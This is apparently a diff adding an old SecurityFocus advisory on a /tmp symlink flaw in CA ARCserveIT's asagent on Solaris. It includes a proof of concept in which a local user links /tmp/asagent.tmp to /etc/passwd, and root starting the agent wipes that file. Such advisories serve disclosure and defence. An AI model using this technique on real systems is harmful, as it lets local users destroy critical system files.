@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/2741/info
+
+ARCservIT from Computer Associates contains a vulnerability which may allow malicious local users to overwrite arbitrary files.
+
+When it runs for the first time, 'asagent', opens (and truncates it if it exists) a file in /tmp called 'asagent.tmp'. 'asagent' does not check to make sure that this file already exists or that is a symbolic link to another file.
+
+This may allow malicious local users to overwrite critical system files. 
+
+As user:
+
+je@boxname~> ln -s /etc/passwd /tmp/asagent.tmp
+
+And root:
+
+root@boxname# /usr/CYEagent/asagent start
+CA Universal Agent ADV v1.39 started on openview SunOS 5.8
+Generic_108528-07 sun4u
+
+ARCserveIT Universal Agent started...
+
+Then,
+
+je@boxname~> ls -la /etc/passwd
+-r--r--r-- 1 0 sys 0 May 9 11:59 /etc/passwd 
